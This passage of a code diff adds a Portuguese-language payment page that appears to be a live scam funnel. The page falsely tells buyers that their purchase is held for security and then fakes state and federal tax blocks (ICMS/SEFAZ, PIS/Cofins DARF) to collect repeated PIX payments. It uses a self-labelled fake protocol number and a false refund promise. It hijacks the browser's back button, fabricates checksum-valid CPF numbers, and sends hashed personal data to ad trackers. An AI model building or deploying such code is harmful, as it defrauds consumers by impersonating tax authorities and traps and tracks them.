@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+  ttq.load('D8K3BJ3C77UDG683OUJ0');
+  ttq.load('D9D5FKRC77U6Q0JCMOC0');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<script>
+(function () {
+  if (!window.ttq) return;
+  async function sha256Hex(str) {
+    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
+  }
+  async function syncIdentify() {
+    const email = localStorage.getItem('email');
+    const phoneRaw = localStorage.getItem('telephone') || localStorage.getItem('telefone');
+    const cpf = localStorage.getItem('cpf');
+    const identify = {};
+    if (email) identify.email = await sha256Hex(email.trim().toLowerCase());
+    if (phoneRaw) {
+      const digits = phoneRaw.replace(/\D/g, '');
+      const e164 = '+' + (digits.startsWith('55') ? digits : '55' + digits);
+      identify.phone_number = await sha256Hex(e164);
+    }
+    if (cpf) identify.external_id = await sha256Hex(cpf.replace(/\D/g, ''));
+    if (Object.keys(identify).length) ttq.identify(identify);
+  }
+  syncIdentify();
+})();
+</script>
+    <meta charset="UTF-8">
+    <!-- viewport-fit=cover garante que respeite as áreas seguras do iPhone -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Ambiente Seguro • Finalização</title>
+    <script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = '/backs/backup/index.html';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "xnzm2z9bd6");
+</script>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', '-apple-system', 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    },
+                    colors: {
+                        brandDark: '#0E1A2B',
+                        success: '#10B981',
+                    },
+                    boxShadow: {
+                        'premium': '0 20px 40px -15px rgba(0,0,0,0.15), 0 0 15px -5px rgba(0,0,0,0.05)',
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        /* Removido o height: 100% e overflow para destravar o scroll no mobile */
+        body {
+            -webkit-tap-highlight-color: transparent;
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        .fade-in { animation: fadeIn 0.3s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .security-stripes { background-color: #10B981; background-image: repeating-linear-gradient(-45deg, transparent, transparent 10px, rgba(255,255,255,0.15) 10px, rgba(255,255,255,0.15) 20px); }
+        .tax-document { background-image: radial-gradient(rgba(0,0,0,0.04) 1px, transparent 1px); background-size: 12px 12px; }
+        .stamp-pending { border: 3px solid currentColor; font-weight: 900; text-transform: uppercase; padding: 2px 8px; border-radius: 6px; transform: rotate(-12deg); opacity: 0.8; letter-spacing: 2px; mix-blend-mode: multiply; }
+        
+        @keyframes scan { 0%, 100% { transform: translateY(0); opacity: 0; } 10% { opacity: 1; } 50% { transform: translateY(200px); opacity: 1; } 90% { opacity: 1; } }
+        .scanner-line { animation: scan 2.5s cubic-bezier(0.4, 0, 0.2, 1) infinite; }
+    </style>
+</head>
+
+<!-- min-h-[100dvh] garante que ocupe a tela toda, mas PERMITE crescer e rolar -->
+<body class="min-h-[100dvh] bg-white sm:bg-[#E5E7EB] flex flex-col items-center justify-start sm:justify-center sm:p-6 text-gray-800 font-sans">
+
+    <div id="toast-container" class="fixed top-4 left-1/2 transform -translate-x-1/2 z-[9999] w-[90%] max-w-[380px] pointer-events-none flex flex-col gap-2"></div>
+
+    <!-- MAIN: Removido 'overflow-hidden' e 'h-full' que estavam travando a tela -->
+    <main class="w-full sm:max-w-[420px] bg-white sm:rounded-3xl shadow-none sm:shadow-premium flex flex-col relative flex-1 sm:flex-none border-b sm:border-0 border-gray-50 min-h-[100dvh] sm:min-h-0">
+        
+        <!-- Header com overflow-hidden restrito apenas a ele para o efeito blur não vazar -->
+        <header class="bg-brandDark text-white py-5 px-6 shrink-0 relative overflow-hidden rounded-t-none sm:rounded-t-3xl">
+            <div class="relative z-10 flex items-center gap-4">
+                <div class="w-11 h-11 rounded-xl bg-white/10 flex items-center justify-center border border-white/10 shadow-[inset_0_1px_1px_rgba(255,255,255,0.1)] shrink-0">
+                    <i data-lucide="shield-check" class="w-5 h-5 text-emerald-400"></i>
+                </div>
+                <div>
+                    <h1 class="text-[16px] font-black tracking-wider uppercase drop-shadow-sm leading-none mb-1.5">Ambiente Seguro</h1>
+                    <div class="flex items-center gap-1.5 bg-white/5 rounded-full px-2 py-0.5 w-fit">
+                        <span class="w-1.5 h-1.5 bg-emerald-400 rounded-full animate-pulse shadow-[0_0_6px_rgba(52,211,153,0.8)] shrink-0"></span>
+                        <p class="text-[11px] text-gray-200 font-mono tracking-tight leading-none font-medium">Conexão Criptografada</p>
+                    </div>
+                </div>
+            </div>
+            <div class="absolute top-0 right-0 w-64 h-64 bg-emerald-500/10 rounded-full blur-3xl -translate-y-32 translate-x-20 pointer-events-none"></div>
+        </header>
+        
+        <div class="w-full h-1.5 security-stripes relative shadow-sm shrink-0 z-10"></div>
+
+        <!-- flex-1 garante que o conteúdo empurre o rodapé, mas os itens internos estão livres -->
+        <div id="app-content" class="flex-1 flex flex-col bg-white relative z-0"></div>
+
+        <footer class="bg-[#F9FAFB] border-t border-gray-100 px-6 py-4 pb-[calc(1.2rem+env(safe-area-inset-bottom))] shrink-0 z-10 relative mt-auto sm:rounded-b-3xl">
+    <div class="flex items-center justify-center gap-5 opacity-70 grayscale transition-all hover:grayscale-0 hover:opacity-100">
+        
+        <!-- Correção: Trocado 'img=' por 'src=' e adicionado fallback de segurança -->
+        <img src="pix.png" alt="Pix" class="h-5 w-auto object-contain" onerror="this.style.display='none'">
+        
+        <div class="w-px h-5 bg-gray-300 rounded-full"></div>
+        <div class="flex items-center gap-1.5 text-[11px] font-mono font-medium text-gray-500">
+            <i data-lucide="lock" class="w-3.5 h-3.5 mb-px"></i> SSL 256-bit
+        </div>
+    </div>
+</footer>
+    </main>
+
+    <script>
+        lucide.createIcons();
+        const PIX_API_BASE = 'https://webhookfuniltodottk.netlify.app/';
+        const PIX_PENDING_MAX_AGE_MS = 30 * 60 * 1000; // depois disso, ignora o PIX antigo e gera um novo
+        const protocoloFake = 'SEC-' + Math.floor(Math.random() * 900000 + 100000);
+        const dataHoje = new Date().toLocaleDateString('pt-BR');
+        let currentTxId = null;
+        let pollingInterval = null;
+
+        function getParam(keys) {
+            const urlParams = new URLSearchParams(window.location.search);
+            for (const key of keys) {
+                const fromUrl = urlParams.get(key);
+                if (fromUrl) return fromUrl;
+            }
+            for (const key of keys) {
+                const fromStorage = localStorage.getItem(key);
+                if (fromStorage) return fromStorage;
+            }
+            return '';
+        }
+
+        const FALLBACK_FIRST_NAMES = ['Maria', 'José', 'Ana', 'João', 'Carlos', 'Paulo', 'Pedro', 'Lucas', 'Marcos', 'Rafael'];
+        const FALLBACK_LAST_NAMES = ['Silva', 'Souza', 'Oliveira', 'Santos', 'Pereira', 'Costa', 'Rodrigues', 'Almeida'];
+        const FALLBACK_DDDS = ['11', '21', '31', '41', '51', '61', '71', '81', '85'];
+
+        function generateFallbackName() {
+            const first = FALLBACK_FIRST_NAMES[Math.floor(Math.random() * FALLBACK_FIRST_NAMES.length)];
+            const last = FALLBACK_LAST_NAMES[Math.floor(Math.random() * FALLBACK_LAST_NAMES.length)];
+            return `${first} ${last}`;
+        }
+
+        function generateFallbackEmail(name) {
+            const slug = name.toLowerCase().normalize('NFD').replace(new RegExp('[\\u0300-\\u036f]', 'g'), '').replace(/[^a-z]+/g, '.');
+            return `${slug}${Math.floor(1000 + Math.random() * 9000)}@gmail.com`;
+        }
+
+        function generateFallbackPhone() {
+            const ddd = FALLBACK_DDDS[Math.floor(Math.random() * FALLBACK_DDDS.length)];
+            const number = '9' + String(Math.floor(10000000 + Math.random() * 89999999));
+            return ddd + number;
+        }
+
+        function generateFallbackDocument() {
+            const calcDigit = (digits) => {
+                let sum = 0;
+                let weight = digits.length + 1;
+                for (const d of digits) { sum += d * weight; weight--; }
+                const mod = sum % 11;
+                return mod < 2 ? 0 : 11 - mod;
+            };
+            const base = Array.from({ length: 9 }, () => Math.floor(Math.random() * 9));
+            const d1 = calcDigit(base);
+            const d2 = calcDigit([...base, d1]);
+            return [...base, d1, d2].join('');
+        }
+
+        function collectCustomerData() {
+            const name = getParam(['nome', 'name']) || generateFallbackName();
+            const email = getParam(['email']) || generateFallbackEmail(name);
+            const document = getParam(['cpf', 'document']) || generateFallbackDocument();
+            const phone = getParam(['telefone', 'telephone', 'phone']) || generateFallbackPhone();
+            return { name, email, document, phone };
+        }
+
+        function showToast(message, type = 'error') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            const configs = type === 'error' 
+                ? { bg: 'bg-red-50', border: 'border-red-100', text: 'text-red-800', icon: 'alert-circle', iconColor: 'text-red-500' }
+                : { bg: 'bg-emerald-50', border: 'border-emerald-100', text: 'text-emerald-800', icon: 'check-circle-2', iconColor: 'text-emerald-500' };
+
+            toast.className = `p-4 rounded-2xl border shadow-lg flex items-start gap-3 transition-all duration-500 transform translate-y-[-20px] opacity-0 ${configs.bg} ${configs.border} backdrop-blur-md`;
+            toast.innerHTML = `
+                <i data-lucide="${configs.icon}" class="w-5 h-5 shrink-0 ${configs.iconColor} mt-0.5"></i>
+                <p class="text-[13px] font-medium leading-snug ${configs.text}">${message}</p>
+            `;
+            
+            container.appendChild(toast);
+            lucide.createIcons();
+            void toast.offsetWidth;
+            toast.classList.remove('translate-y-[-20px]', 'opacity-0');
+
+            setTimeout(() => {
+                toast.classList.add('translate-y-[-20px]', 'opacity-0');
+                setTimeout(() => toast.remove(), 500);
+            }, 5000);
+        }
+
+        const FUNIL = {
+            'erro_pagamento': {
+                id: 'erro_pagamento',
+                titulo: 'Retenção de Segurança',
+                icone: 'shield-alert',
+                corIcone: 'text-amber-600',
+                bgIcone: 'bg-amber-50 border-amber-100',
+                mensagem: `O seu pagamento principal foi aprovado, mas o sistema anti-fraude <b>reteve a liberação automática</b> do acesso por segurança.<br><br>Para comprovar a titularidade imediata e evitar o estorno, é necessária uma verificação simplificada.<br><br><span class="text-[11px] sm:text-[12px] text-gray-500 font-medium">ℹ️ Fique tranquilo: Este valor é simbólico e será <b>reembolsado automaticamente</b> via PIX após a validação.</span>`,
+                valor: 'R$ 14,90',
+                botao: 'VERIFICAR E LIBERAR ACESSO',
+                link: null,
+                proximoCenario: 'icms',
+                documentoVisual: false
+            },
+            'icms': {
+                id: 'icms',
+                titulo: 'Bloqueio Fiscal (SEFAZ)',
+                icone: 'scroll-text',
+                corIcone: 'text-red-600',
+                bgIcone: 'bg-red-50 border-red-100',
+                mensagem: `Sincronização bem-sucedida. No entanto, a liberação do produto digital foi interceptada pelo sistema da Secretaria da Fazenda.<br><br>Conforme a legislação vigente, é obrigatório o recolhimento do <b>ICMS (Imposto sobre Circulação)</b> para emissão da Nota Fiscal.<br><br>Regularize a guia abaixo para prosseguir.`,
+                valor: 'R$ 22,50',
+                botao: 'REGULARIZAR GUIA (ICMS)',
+                link: null,
+                proximoCenario: 'pis_cofins',
+                documentoVisual: `
+                    <div class="bg-[#FFFDFD] border border-red-200 rounded-2xl p-5 mb-2 text-left relative overflow-hidden shadow-[0_4px_20px_-10px_rgba(220,38,38,0.2)] tax-document">
+                        <div class="absolute top-4 right-4 z-20">
+                            <div class="stamp-pending text-[11px] text-red-700 border-red-700">BLOQUEADO SEFAZ</div>
+                        </div>
+                        <div class="flex items-center gap-3 mb-6 relative z-10">
+                            <div class="p-2 bg-red-100 rounded-lg">
+                                <i data-lucide="landmark" class="w-6 h-6 text-red-700"></i>
+                            </div>
+                            <div>
+                                <p class="text-[12px] font-black text-gray-800 uppercase tracking-tight">DAE ESTADUAL</p>
+                                <p class="text-[10px] text-gray-500 font-medium leading-none">Documento de Arrecadação Estadual</p>
+                            </div>
+                        </div>
+                        <div class="space-y-4 relative z-10">
+                            <div class="bg-red-50/80 px-3 py-2 rounded-lg border border-red-100/50 flex items-center gap-2">
+                                <i data-lucide="alert-triangle" class="w-4 h-4 text-red-600"></i>
+                                <p class="text-[11px] font-bold text-red-800 uppercase leading-none">Notificação de Retenção Fiscal</p>
+                            </div>
+                            <div class="grid grid-cols-2 gap-4 py-2 border-y border-red-100/50">
+                                <div><p class="text-[10px] text-gray-500 uppercase font-bold mb-1">Vencimento</p><p class="text-[13px] font-mono font-bold text-red-600">IMEDIATO</p></div>
+                                <div><p class="text-[10px] text-gray-500 uppercase font-bold mb-1">Cód. Receita</p><p class="text-[13px] font-mono font-bold text-gray-800">10009-0 <span class="text-[10px] text-gray-500">(ICMS)</span></p></div>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-[12px] font-bold text-red-900 uppercase">Valor Total</span>
+                                <span class="text-[20px] font-black text-red-900 font-mono tracking-tight">R$ 22,50</span>
+                            </div>
+                        </div>
+                    </div>
+                `
+            },
+            'pis_cofins': {
+                id: 'pis_cofins',
+                titulo: 'Última Pendência Federal',
+                icone: 'file-warning',
+                corIcone: 'text-amber-700',
+                bgIcone: 'bg-amber-50 border-amber-100',
+                mensagem: `Nota Fiscal Estadual processada! O sistema detectou apenas uma última pendência de nível federal atrelada ao seu CPF.<br><br>Trata-se do recolhimento unificado de <b>PIS/Cofins</b>. Esta é a exigência legal <b>final</b> para a liberação imediata do seu acesso.`,
+                valor: 'R$ 11,99',
+                botao: 'PAGAR DARF E ACESSAR MATERIAL',
+                link: null,
+                proximoCenario: 'sucesso',
+                documentoVisual: `
+                    <div class="bg-[#FFFCF2] border border-amber-200 rounded-2xl p-5 mb-2 text-left relative overflow-hidden shadow-[0_4px_20px_-10px_rgba(180,83,9,0.2)] tax-document">
+                        <div class="absolute top-4 right-4 z-20">
+                            <div class="stamp-pending text-[11px] text-amber-700 border-amber-700">PENDENTE RFB</div>
+                        </div>
+                        <div class="flex items-center gap-3 mb-6 relative z-10">
+                            <div class="p-2 bg-amber-100 rounded-lg">
+                                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgMTc3Ij48cGF0aCBmaWxsPSIjMzJiY2FkIiBkPSJNMTA3LjkgODguNWwzOS44LTQwLjljNC00LjEgMTAuNS00LjEgMTQuNSAwTDExMyAxMTYuMWMtNC4xIDQtMTAuNiA0LTE0LjcgMEw1OS42IDYxLjRjNC00LjIgMTAuNS00LjEgMTQuNSAwTDExNCAxMDJjNC4yIDQuMSAxMC42IDQuMSAxNC43IDBMOTIuMyA2NS44Yy00LjItNC4xLTEwLjYtNC4xLTE0LjcgMGwtMzkuOCA0MC45Yy00IDQuMS0xMC42IDQuMS0xNC41IDBsNDkuMi02OC41YzQuMS00LjEgMTAuNi00LjEgMTQuNyAwbDM4LjYgMzkuOGMtNC4xIDQuMS0xMC42IDQuMS0xNC43IDBsLTM2LjQtMzcuNGMtNC00LjEtMTAuNS00LjEtMTQuNSAwTDguNSA5MmMtNC4xIDQuMS00LjEgMTAuNiAwIDE0LjdsNDkuMiA2OC41YzQuMSA0LjEgMTAuNiA0LjEgMTQuNyAwbDM4LjYtMzkuOGM0LjEtNC4xIDEwLjYtNC4xIDE0LjcgMGwzNi40IDM3LjRjNCA0LjEgMTAuNSA0LjEgMTQuNSAwTDE2Ni44IDEwN2M0LjEtNC4xIDQuMS0xMC42IDAtMTQuN2wtNDkuMi02OC41Yy00LjEtNC4xLTEwLjYtNC4xLTE0LjcgMGwtMzguNiAzOS44YzQtNC4xIDEwLjYtNC4xIDE0LjcgMHoiLz48L3N2Zz4=" class="w-6 h-6 opacity-70 sepia-[0.5] mix-blend-multiply" alt="Brasão">
+                            </div>
+                            <div>
+                                <p class="text-[12px] font-black text-gray-800 uppercase tracking-tight">DARF FEDERAL</p>
+                                <p class="text-[10px] text-gray-500 font-medium leading-none">Ministério da Economia - Receita Federal</p>
+                            </div>
+                        </div>
+                        <div class="space-y-4 relative z-10">
+                            <div class="bg-amber-50/80 px-3 py-2 rounded-lg border border-amber-100/50 flex items-center gap-2">
+                                <i data-lucide="info" class="w-4 h-4 text-amber-700"></i>
+                                <p class="text-[11px] font-bold text-amber-800 uppercase leading-none">Aviso de Débito em Aberto</p>
+                            </div>
+                            <div class="grid grid-cols-2 gap-4 py-2 border-y border-amber-100/50">
+                                <div><p class="text-[10px] text-gray-500 uppercase font-bold mb-1">Período</p><p class="text-[13px] font-mono font-bold text-gray-800">${dataHoje}</p></div>
+                                <div><p class="text-[10px] text-gray-500 uppercase font-bold mb-1">Cód. Receita</p><p class="text-[13px] font-mono font-bold text-gray-800">8109 <span class="text-[10px] text-gray-500">(PIS/COFINS)</span></p></div>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-[12px] font-bold text-amber-900 uppercase">Valor Total</span>
+                                <span class="text-[20px] font-black text-amber-900 font-mono tracking-tight">R$ 11,99</span>
+                            </div>
+                        </div>
+                    </div>
+                `
+            }
+        };
+
+        function renderizarTela(cenarioId) {
+            const data = FUNIL[cenarioId];
+            localStorage.setItem('ultimoStep', cenarioId);
+            const contentDiv = document.getElementById('app-content');
+            
+            const blocoValorOuDocumento = data.documentoVisual ? data.documentoVisual : `
+                <div class="border border-gray-100 rounded-2xl p-6 text-center bg-gray-50/50 relative overflow-hidden group">
+                    <div class="absolute inset-0 bg-gradient-to-tr from-transparent via-transparent to-gray-100/50 opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
+                    <p class="text-[11px] text-gray-500 font-bold uppercase tracking-wider mb-2 relative z-10">Valor da Verificação</p>
+                    <h3 class="text-[32px] font-black text-gray-900 font-mono tracking-tighter relative z-10">${data.valor}</h3>
+                </div>
+            `;
+
+            // REMOVIDO o "flex-1" do topo e ajustado o "mt-6" (margin-top) para o botão ficar mais próximo
+            contentDiv.innerHTML = `
+                <div class="fade-in flex flex-col p-6">
+                    <div>
+                        <div class="flex items-center gap-4 mb-6">
+                            <div class="w-14 h-14 rounded-2xl ${data.bgIcone} border flex items-center justify-center shrink-0 shadow-sm">
+                                <i data-lucide="${data.icone}" class="w-7 h-7 ${data.corIcone}"></i>
+                            </div>
+                            <div>
+                                <h2 class="text-[20px] font-black text-gray-900 leading-tight tracking-tight">${data.titulo}</h2>
+                            </div>
+                        </div>
+
+                        <div class="text-[14px] text-gray-600 leading-relaxed mb-6 font-medium">${data.mensagem}</div>
+                        ${blocoValorOuDocumento}
+                    </div>
+
+                    <!-- Botão colado no conteúdo, mt-6 define uma distância curta e natural -->
+                    <div class="mt-6 w-full shrink-0 relative z-20">
+                        <button id="btn-principal" onclick="handleBotaoPrincipal('${data.id}')"
+                            class="w-full bg-brandDark hover:bg-[#1A2C45] text-white font-bold py-4 px-4 rounded-xl shadow-[0_8px_20px_-8px_rgba(14,26,43,0.5)] transition-all active:scale-[0.98] flex items-center justify-center gap-2 text-[15px] relative overflow-hidden group">
+                            <span class="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-[100%] group-hover:translate-x-[100%] transition-transform duration-700 ease-in-out"></span>
+                            <span class="relative flex items-center gap-2">${data.botao} <i data-lucide="chevron-right" class="w-4 h-4 opacity-70 group-hover:translate-x-1 transition-transform"></i></span>
+                        </button>
+                        <div id="area-pix" class="hidden w-full"></div>
+                    </div>
+                </div>
+            `;
+            lucide.createIcons();
+        }
+
+        function handleBotaoPrincipal(cenarioId) {
+            const data = FUNIL[cenarioId];
+            if (data.link) {
+                window.location.href = data.link;
+                return;
+            }
+            gerarCobranca(cenarioId);
+        }
+
+        async function gerarCobranca(cenarioId) {
+            const btn = document.getElementById('btn-principal');
+            const areaPix = document.getElementById('area-pix');
+
+            btn.innerHTML = `<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i><span class="animate-pulse">Conectando ao Gateway...</span>`;
+            btn.classList.add('opacity-80', 'pointer-events-none');
+            lucide.createIcons();
+
+            try {
+                // Se já existe um PIX gerado e ainda não pago pra esse cenário,
+                // reaproveita ele em vez de gerar outro (evita gerar PIX
+                // infinitamente a cada tentativa).
+                const pendingKey = 'pix_pending_upsell-' + cenarioId;
+                const pendingRaw = localStorage.getItem(pendingKey);
+                if (pendingRaw) {
+                    try {
+                        const pending = JSON.parse(pendingRaw);
+                        const isFresh = pending.id && (Date.now() - pending.ts) < PIX_PENDING_MAX_AGE_MS;
+                        if (isFresh) {
+                            const statusRes = await fetch(`${PIX_API_BASE}/api/pix/status?id=${encodeURIComponent(pending.id)}`);
+                            const statusData = await statusRes.json();
+                            if (statusData.status === 'pending' && statusData.qrCode) {
+                                currentTxId = pending.id;
+                                exibirLayoutPix(statusData.qrCode, cenarioId);
+                                return;
+                            }
+                        }
+                    } catch (e) {}
+                    localStorage.removeItem(pendingKey);
+                }
+
+                const customer = collectCustomerData();
+                const urlParams = new URLSearchParams(window.location.search);
+                const tracking = {
+                    utm_source: urlParams.get('utm_source') || '',
+                    utm_medium: urlParams.get('utm_medium') || '',
+                    utm_campaign: urlParams.get('utm_campaign') || '',
+                    utm_content: urlParams.get('utm_content') || '',
+                    utm_term: urlParams.get('utm_term') || '',
+                    src: urlParams.get('src') || '',
+                    sck: urlParams.get('sck') || '',
+                };
+
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 15000);
+
+                let response;
+                try {
+                    response = await fetch(`${PIX_API_BASE}/api/pix/create`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                        body: JSON.stringify({ ...customer, product: 'upsell-' + cenarioId, tracking }),
+                        signal: controller.signal
+                    });
+                    clearTimeout(timeoutId);
+                } catch(fetchError) {
+                    if (fetchError.name === 'AbortError') throw new Error("Tempo limite de conexão excedido.");
+                    throw new Error(`Erro de conexão com o servidor de pagamentos.`);
+                }
+
+                const rawText = await response.text();
+                let result;
+                try { result = JSON.parse(rawText); }
+                catch(e) { throw new Error(`O gateway retornou uma resposta inválida.`); }
+
+                if (!response.ok) {
+                    throw new Error(result.error || "Transação não autorizada momentaneamente.");
+                }
+
+                if (result.qrCode) {
+                    currentTxId = result.transactionId || null;
+                    if (currentTxId) localStorage.setItem(pendingKey, JSON.stringify({ id: currentTxId, ts: Date.now() }));
+                    exibirLayoutPix(result.qrCode, cenarioId);
+                } else {
+                    throw new Error("Dados de pagamento não recebidos do gateway.");
+                }
+
+            } catch (error) {
+                btn.classList.add('hidden');
+                areaPix.classList.remove('hidden');
+                areaPix.classList.add('fade-in', 'mt-4');
+                areaPix.innerHTML = `
+                    <div class="p-5 bg-red-50 border border-red-100 rounded-2xl text-left shadow-sm relative overflow-hidden">
+                        <div class="absolute -right-4 -top-4 text-red-100 opacity-50"><i data-lucide="alert-octagon" class="w-24 h-24"></i></div>
+                        <div class="flex items-center gap-3 text-red-800 mb-3 relative z-10">
+                            <div class="p-2 bg-red-100 rounded-full"><i data-lucide="wifi-off" class="w-5 h-5"></i></div>
+                            <h4 class="font-bold text-[15px]">Falha na Comunicação</h4>
+                        </div>
+                        <p class="text-[13px] text-red-700 font-medium leading-relaxed relative z-10 mb-4">${error.message}</p>
+                        <button onclick="window.location.reload()" class="relative z-10 w-full bg-red-100 hover:bg-red-200 text-red-800 font-bold py-3 rounded-xl text-sm transition-colors flex items-center justify-center gap-2">
+                            <i data-lucide="rotate-cw" class="w-4 h-4"></i> TENTAR NOVAMENTE
+                        </button>
+                    </div>
+                `;
+                lucide.createIcons();
+            }
+        }
+
+        function exibirLayoutPix(codigoCopia, cenarioId) {
+            const btn = document.getElementById('btn-principal');
+            const areaPix = document.getElementById('area-pix');
+
+            btn.classList.add('hidden');
+            areaPix.classList.remove('hidden');
+            areaPix.classList.add('fade-in');
+
+            areaPix.innerHTML = `
+                <div class="border-t border-gray-100/80 pt-6 mt-2 flex flex-col items-center w-full text-center">
+                    <p class="text-[14px] font-bold text-gray-900 mb-4">Copie o código PIX abaixo e pague no app do seu banco:</p>
+
+                    <div class="w-full mb-4 relative group">
+                        <div class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 group-hover:text-brandDark transition-colors">
+                            <i data-lucide="clipboard-copy" class="w-5 h-5"></i>
+                        </div>
+                        <input type="text" value="${codigoCopia}" readonly class="w-full bg-gray-50 border border-gray-200 text-gray-600 text-[11px] rounded-xl pl-4 pr-10 py-4 font-mono truncate focus:outline-none focus:border-brandDark transition-all cursor-pointer shadow-sm hover:bg-gray-100" onclick="this.select(); document.execCommand('copy'); dispararFeedbackCopia();">
+                    </div>
+                    
+                    <button onclick="copiarCodigoPix('${codigoCopia}')" id="btn-copiar"
+                        class="w-full bg-brandDark hover:bg-[#1A2C45] text-white font-bold py-4 rounded-xl shadow-[0_8px_20px_-8px_rgba(14,26,43,0.5)] transition-all active:scale-[0.98] flex items-center justify-center gap-2 mb-6 text-[15px]">
+                        <i data-lucide="copy" class="w-5 h-5"></i> COPIAR CÓDIGO PIX
+                    </button>
+
+                    <div class="w-full bg-emerald-50/80 border border-emerald-200 rounded-2xl p-5 flex flex-col items-center text-center shadow-sm relative overflow-hidden">
+                         <div class="absolute inset-0 bg-[radial-gradient(#10b981_1px,transparent_1px)] [background-size:16px_16px] opacity-[0.15]"></div>
+                        <div class="flex items-center gap-2.5 mb-3 relative z-10">
+                            <div class="relative flex h-4 w-4 items-center justify-center">
+                              <span class="animate-ping absolute inline-flex h-3 w-3 rounded-full bg-emerald-500 opacity-75"></span>
+                              <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-600"></span>
+                            </div>
+                            <h4 class="text-[13px] text-emerald-800 font-bold uppercase tracking-wide">Aguardando Confirmação</h4>
+                        </div>
+                        <p class="text-[12px] text-emerald-700 mb-5 font-medium leading-relaxed px-2 relative z-10">
+                            O sistema detectará seu pagamento automaticamente. Caso prefira, clique abaixo após pagar.
+                        </p>
+                        <button onclick="verificarPagamentoManual('${cenarioId}')" id="btn-verificar"
+                            class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3.5 rounded-xl shadow-md transition-all active:scale-[0.98] flex items-center justify-center gap-2 text-[14px] relative z-10">
+                            <i data-lucide="check-circle-2" class="w-5 h-5 text-white/90"></i> JÁ REALIZEI O PAGAMENTO
+                        </button>
+                    </div>
+                </div>
+            `;
+            lucide.createIcons();
+            
+            if (currentTxId) {
+                iniciarPollingPagamento(currentTxId, cenarioId);
+            }
+        }
+
+        function copiarCodigoPix(texto) {
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(texto)
+                    .then(dispararFeedbackCopia)
+                    .catch(() => usarFallbackCopia(texto));
+            } else {
+                usarFallbackCopia(texto);
+            }
+        }
+
+        function usarFallbackCopia(texto) {
+             const textArea = document.createElement("textarea");
+             textArea.value = texto;
+             textArea.style.position = "fixed"; 
+             textArea.style.top = "0"; 
+             textArea.style.left = "0";
+             textArea.style.opacity = "0"; 
+             document.body.appendChild(textArea);
+             textArea.focus();
+             textArea.select();
+             try {
+                 const successful = document.execCommand('copy');
+                 if(successful) dispararFeedbackCopia();
+             } catch (err) {
+                 showToast("Não foi possível copiar automaticamente. Selecione e copie manualmente.", "error");
+             }
